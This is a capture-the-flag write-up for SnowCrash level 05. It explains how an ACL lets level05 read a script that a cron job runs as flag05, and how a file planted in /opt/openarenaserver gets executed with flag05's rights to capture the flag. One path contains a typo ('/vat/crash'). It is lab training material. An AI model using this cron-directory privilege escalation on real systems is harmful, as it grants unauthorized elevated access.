# level 05

in this level we where provided with an email which is a file that shows a cronjob that runs a script each two minutes as flag05

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

after that we tried to read the file that contains the script and even though its access rights look like we cannot read them, we can due to Access Control Lists (ACLs) which are aditional access rights can be seen using the command getfacl 


```
level05@SnowCrash:/var/crash$ getfacl /usr/sbin/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

it has defined a specific right only for the user:level05 with only read access, and after reading the file we got 
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

this is a simple bash script that reads all the files in the repo /opt/openarenaserver/ and opens a new subshell and applies a limit of 5 seconds which means the lifetime of this subshell is 5 seconds and runs the bash script found in the repo in it 

```
test.sh

getflag > /vat/crash/test.txt
```

and if you read the file you'll find the flag there
